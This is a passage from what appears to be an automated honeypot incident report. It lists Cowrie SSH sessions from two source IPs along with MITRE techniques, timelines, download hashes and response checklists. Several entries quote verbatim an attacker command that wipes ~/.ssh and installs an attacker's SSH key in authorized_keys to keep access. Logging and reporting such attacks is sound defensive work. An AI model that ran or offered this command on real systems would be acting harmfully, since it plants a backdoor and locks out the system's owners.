| `2026-05-20 20:29:18` | `cowrie.command.failed` |
| `2026-05-20 20:29:19` | `cowrie.log.closed` |
| `2026-05-20 20:29:19` | `cowrie.session.params` |
| `2026-05-20 20:29:19` | `cowrie.command.input` |
| `2026-05-20 20:29:20` | `cowrie.session.file_download` |
| `2026-05-20 20:29:20` | `cowrie.log.closed` |
| `2026-05-20 20:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6d4c2ae2804

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:29 |
| **Last Seen** | 2026-05-20 20:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:29:22` | `cowrie.session.connect` |
| `2026-05-20 20:29:22` | `cowrie.client.version` |
| `2026-05-20 20:29:22` | `cowrie.client.kex` |
| `2026-05-20 20:29:23` | `cowrie.login.success` |
| `2026-05-20 20:29:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5624bd05b4d

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:30 |
| **Last Seen** | 2026-05-20 20:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:30:41` | `cowrie.session.connect` |
| `2026-05-20 20:30:41` | `cowrie.client.version` |
| `2026-05-20 20:30:42` | `cowrie.client.kex` |
| `2026-05-20 20:30:43` | `cowrie.login.success` |
| `2026-05-20 20:30:43` | `cowrie.session.params` |
| `2026-05-20 20:30:43` | `cowrie.command.input` |
| `2026-05-20 20:30:43` | `cowrie.command.failed` |
| `2026-05-20 20:30:44` | `cowrie.log.closed` |
| `2026-05-20 20:30:44` | `cowrie.session.params` |
| `2026-05-20 20:30:44` | `cowrie.command.input` |
| `2026-05-20 20:30:44` | `cowrie.session.file_download` |
| `2026-05-20 20:30:44` | `cowrie.log.closed` |
| `2026-05-20 20:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d140cf0852ad

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:30 |
| **Last Seen** | 2026-05-20 20:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:30:47` | `cowrie.session.connect` |
| `2026-05-20 20:30:47` | `cowrie.client.version` |
| `2026-05-20 20:30:47` | `cowrie.client.kex` |
| `2026-05-20 20:30:48` | `cowrie.login.success` |
| `2026-05-20 20:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34df29c6b44f

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:32 |
| **Last Seen** | 2026-05-20 20:32 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:32:05` | `cowrie.session.connect` |
| `2026-05-20 20:32:05` | `cowrie.client.version` |
| `2026-05-20 20:32:05` | `cowrie.client.kex` |
| `2026-05-20 20:32:06` | `cowrie.login.success` |
| `2026-05-20 20:32:07` | `cowrie.session.params` |
| `2026-05-20 20:32:07` | `cowrie.command.input` |
| `2026-05-20 20:32:07` | `cowrie.command.failed` |
| `2026-05-20 20:32:07` | `cowrie.log.closed` |
| `2026-05-20 20:32:08` | `cowrie.session.params` |
| `2026-05-20 20:32:08` | `cowrie.command.input` |
| `2026-05-20 20:32:08` | `cowrie.session.file_download` |
| `2026-05-20 20:32:08` | `cowrie.log.closed` |
| `2026-05-20 20:32:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b599d47d383f

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 20:32 |
| **Last Seen** | 2026-05-20 20:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:32:11` | `cowrie.session.connect` |
| `2026-05-20 20:32:11` | `cowrie.client.version` |
| `2026-05-20 20:32:11` | `cowrie.client.kex` |
| `2026-05-20 20:32:12` | `cowrie.login.success` |
| `2026-05-20 20:32:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db047ca2be41

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 20:54 |
| **Last Seen** | 2026-05-20 20:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:54:14` | `cowrie.session.connect` |
| `2026-05-20 20:54:14` | `cowrie.client.version` |
| `2026-05-20 20:54:14` | `cowrie.client.kex` |
| `2026-05-20 20:54:16` | `cowrie.login.success` |
| `2026-05-20 20:54:16` | `cowrie.session.params` |
| `2026-05-20 20:54:16` | `cowrie.command.input` |
| `2026-05-20 20:54:16` | `cowrie.command.failed` |
| `2026-05-20 20:54:17` | `cowrie.log.closed` |
| `2026-05-20 20:54:18` | `cowrie.session.params` |
| `2026-05-20 20:54:18` | `cowrie.command.input` |
| `2026-05-20 20:54:18` | `cowrie.session.file_download` |
| `2026-05-20 20:54:18` | `cowrie.log.closed` |
| `2026-05-20 20:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ed68daf82f9

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 20:54 |
| **Last Seen** | 2026-05-20 20:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:54:22` | `cowrie.session.connect` |
| `2026-05-20 20:54:22` | `cowrie.client.version` |
| `2026-05-20 20:54:22` | `cowrie.client.kex` |
| `2026-05-20 20:54:23` | `cowrie.login.success` |
| `2026-05-20 20:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41f4fc4d5ad8

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 20:55 |
| **Last Seen** | 2026-05-20 20:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:55:48` | `cowrie.session.connect` |
| `2026-05-20 20:55:48` | `cowrie.client.version` |
| `2026-05-20 20:55:49` | `cowrie.client.kex` |
| `2026-05-20 20:55:50` | `cowrie.login.success` |
| `2026-05-20 20:55:51` | `cowrie.session.params` |
| `2026-05-20 20:55:51` | `cowrie.command.input` |
| `2026-05-20 20:55:51` | `cowrie.command.failed` |
| `2026-05-20 20:55:52` | `cowrie.log.closed` |
| `2026-05-20 20:55:52` | `cowrie.session.params` |
| `2026-05-20 20:55:52` | `cowrie.command.input` |
| `2026-05-20 20:55:52` | `cowrie.session.file_download` |
| `2026-05-20 20:55:52` | `cowrie.log.closed` |
| `2026-05-20 20:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f81b03a9766

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 20:55 |
| **Last Seen** | 2026-05-20 20:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:55:56` | `cowrie.session.connect` |
| `2026-05-20 20:55:56` | `cowrie.client.version` |
| `2026-05-20 20:55:57` | `cowrie.client.kex` |
| `2026-05-20 20:55:58` | `cowrie.login.success` |
| `2026-05-20 20:55:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a86fdf2aab

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 20:58 |
| **Last Seen** | 2026-05-20 20:59 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:58:54` | `cowrie.session.connect` |
| `2026-05-20 20:58:56` | `cowrie.client.version` |
| `2026-05-20 20:58:56` | `cowrie.client.kex` |
| `2026-05-20 20:58:57` | `cowrie.login.success` |
| `2026-05-20 20:58:58` | `cowrie.session.params` |
| `2026-05-20 20:58:58` | `cowrie.command.input` |
| `2026-05-20 20:58:58` | `cowrie.command.failed` |
| `2026-05-20 20:58:58` | `cowrie.log.closed` |
| `2026-05-20 20:58:59` | `cowrie.session.params` |
| `2026-05-20 20:58:59` | `cowrie.command.input` |
| `2026-05-20 20:58:59` | `cowrie.session.file_download` |
| `2026-05-20 20:58:59` | `cowrie.log.closed` |
| `2026-05-20 20:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49a571e462cc

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 20:59 |
| **Last Seen** | 2026-05-20 20:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 20:59:03` | `cowrie.session.connect` |
| `2026-05-20 20:59:03` | `cowrie.client.version` |
| `2026-05-20 20:59:03` | `cowrie.client.kex` |
| `2026-05-20 20:59:05` | `cowrie.login.success` |
| `2026-05-20 20:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea7ce8a19c33

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 21:00 |
| **Last Seen** | 2026-05-20 21:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:00:24` | `cowrie.session.connect` |
| `2026-05-20 21:00:24` | `cowrie.client.version` |
| `2026-05-20 21:00:25` | `cowrie.client.kex` |
| `2026-05-20 21:00:26` | `cowrie.login.success` |
| `2026-05-20 21:00:27` | `cowrie.session.params` |
| `2026-05-20 21:00:27` | `cowrie.command.input` |
| `2026-05-20 21:00:27` | `cowrie.command.failed` |
| `2026-05-20 21:00:28` | `cowrie.log.closed` |
| `2026-05-20 21:00:28` | `cowrie.session.params` |
| `2026-05-20 21:00:28` | `cowrie.command.input` |
| `2026-05-20 21:00:29` | `cowrie.session.file_download` |
| `2026-05-20 21:00:29` | `cowrie.log.closed` |
| `2026-05-20 21:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3eef18a5fc8

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 21:00 |
| **Last Seen** | 2026-05-20 21:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:00:33` | `cowrie.session.connect` |
| `2026-05-20 21:00:33` | `cowrie.client.version` |
| `2026-05-20 21:00:33` | `cowrie.client.kex` |
| `2026-05-20 21:00:34` | `cowrie.login.success` |
| `2026-05-20 21:00:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c42d412e892

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 21:06 |
| **Last Seen** | 2026-05-20 21:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:06:38` | `cowrie.session.connect` |
| `2026-05-20 21:06:38` | `cowrie.client.version` |
| `2026-05-20 21:06:38` | `cowrie.client.kex` |
| `2026-05-20 21:06:40` | `cowrie.login.success` |
| `2026-05-20 21:06:40` | `cowrie.session.params` |
| `2026-05-20 21:06:40` | `cowrie.command.input` |
| `2026-05-20 21:06:40` | `cowrie.command.failed` |
| `2026-05-20 21:06:41` | `cowrie.log.closed` |
| `2026-05-20 21:06:41` | `cowrie.session.params` |
| `2026-05-20 21:06:41` | `cowrie.command.input` |
| `2026-05-20 21:06:42` | `cowrie.session.file_download` |
| `2026-05-20 21:06:42` | `cowrie.log.closed` |
| `2026-05-20 21:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b775f550f56

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 21:06 |
| **Last Seen** | 2026-05-20 21:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:06:46` | `cowrie.session.connect` |
| `2026-05-20 21:06:46` | `cowrie.client.version` |
| `2026-05-20 21:06:46` | `cowrie.client.kex` |
| `2026-05-20 21:06:47` | `cowrie.login.success` |
| `2026-05-20 21:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8207e892a8

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 21:09 |
| **Last Seen** | 2026-05-20 21:09 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:09:37` | `cowrie.session.connect` |
| `2026-05-20 21:09:37` | `cowrie.client.version` |
| `2026-05-20 21:09:37` | `cowrie.client.kex` |
| `2026-05-20 21:09:39` | `cowrie.login.success` |
| `2026-05-20 21:09:40` | `cowrie.session.params` |
| `2026-05-20 21:09:40` | `cowrie.command.input` |
| `2026-05-20 21:09:40` | `cowrie.command.failed` |
| `2026-05-20 21:09:40` | `cowrie.log.closed` |
| `2026-05-20 21:09:41` | `cowrie.session.params` |
| `2026-05-20 21:09:41` | `cowrie.command.input` |
| `2026-05-20 21:09:41` | `cowrie.session.file_download` |
| `2026-05-20 21:09:41` | `cowrie.log.closed` |
| `2026-05-20 21:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5935c884fd1

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-05-20 21:09 |
| **Last Seen** | 2026-05-20 21:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 21:09:45` | `cowrie.session.connect` |
| `2026-05-20 21:09:45` | `cowrie.client.version` |
| `2026-05-20 21:09:45` | `cowrie.client.kex` |
| `2026-05-20 21:09:47` | `cowrie.login.success` |
| `2026-05-20 21:09:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0501c290efe

